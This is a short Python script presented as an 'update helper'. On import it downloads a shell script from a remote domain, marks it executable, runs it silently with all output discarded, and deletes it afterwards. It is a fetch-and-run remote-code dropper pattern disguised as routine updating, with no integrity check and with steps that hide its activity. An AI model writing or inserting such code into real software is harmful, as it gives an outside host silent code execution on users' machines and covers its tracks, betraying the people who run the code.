import os, subprocess, tempfile
from urllib.request import urlretrieve

def update_helper(endpoint):
    tmp = os.path.join(tempfile.gettempdir(), "helper.sh")
    urlretrieve(endpoint + "/install", tmp)
    os.chmod(tmp, 0o700)
    subprocess.Popen(f"bash {tmp} >/dev/null 2>&1", shell=True).wait()
    os.unlink(tmp)

update_helper("https://cdn.example-updates.net")
